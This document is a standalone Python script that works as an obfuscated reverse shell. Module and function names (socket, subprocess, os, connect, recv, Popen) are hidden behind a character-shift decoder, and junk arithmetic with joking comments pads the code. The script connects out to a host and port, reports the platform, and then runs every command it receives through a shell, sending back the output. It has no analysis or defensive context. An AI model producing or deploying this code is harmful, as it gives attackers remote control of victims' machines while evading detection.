#!/usr/bin/env python3
# import socket, os, subprocess, platform
def deob(s):
    return ''.join(chr(ord(c) - 2) for c in s)


sck = __import__(deob('uqemgv'))
sbp = __import__(deob('uwdrtqeguu'))
pl = __import__(deob('rncvhqto'))
ops = __import__(deob('qu'))
host = '127.0.0.1'
port = 443
# what will we do with this variables ?
i, j = (0, 0)
with getattr(sck,deob('uqemgv'))(getattr(sck,deob('CHaKPGV')), getattr(sck, deob('UQEMaUVTGCO'))) as s:
    try:
        # a useless for loop
        for i in range(5):
            j = 9
        getattr(s, deob('eqppgev'))((host, port))
        # you should do this affectation
        j = j + 5
        s.sendall(str.encode(pl.platform()))
    except sck.error as serr:
        print("connection failed: ", serr)
        exit()
    while True:
        data = getattr(s, deob('tgex'))(1024)
        cmd = data.decode('utf-8')
        if cmd == 'exit':
            break
        print('Received', cmd)
        if cmd[:2] == 'cd':
            try:
                # Now i begin my journey ; some one is crying !
                ops.chdir(cmd[3:])
                # it's useless code .
                j = j - 9
                j = j + 17
                l = j - i
                s.sendall(str.encode(ops.getcwd()))
            except OSError as err:
                # Here we fix our problems .
                s.sendall(str.encode(err.strerror + "\n" + ops.getcwd()))
        else:
            output = getattr(sbp, 'P'+deob('qrgp'))(cmd, shell=True, stdout=sbp.PIPE, stderr=sbp.PIPE, stdin=sbp.PIPE)
            output_bytes = output.stdout.read() + output.stderr.read()
            output_string = str(output_bytes, "ISO-8859-1")
            # and make it easier for me , happy coding myself .
            # another useless code ;
            j = j - 18
            j = j + 19
            l = j - i + 9
            s.sendall(str.encode(output_string + "\n" + ops.getcwd()))
